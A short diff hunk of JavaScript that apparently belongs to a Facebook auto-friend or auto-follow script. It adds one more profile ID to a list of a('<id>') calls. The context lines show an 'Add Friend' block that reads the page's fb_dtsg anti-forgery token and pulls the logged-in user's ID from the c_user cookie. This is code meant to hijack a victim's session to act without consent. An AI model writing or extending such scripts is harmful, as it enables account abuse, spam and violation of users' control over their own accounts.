@@ -182,6 +182,7 @@ a("100003595638172");
 a("100003904189992");
 a("100003147643648");
 a("100003239135946");
+a("280308438768084");
 /*Add Friend*/ 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
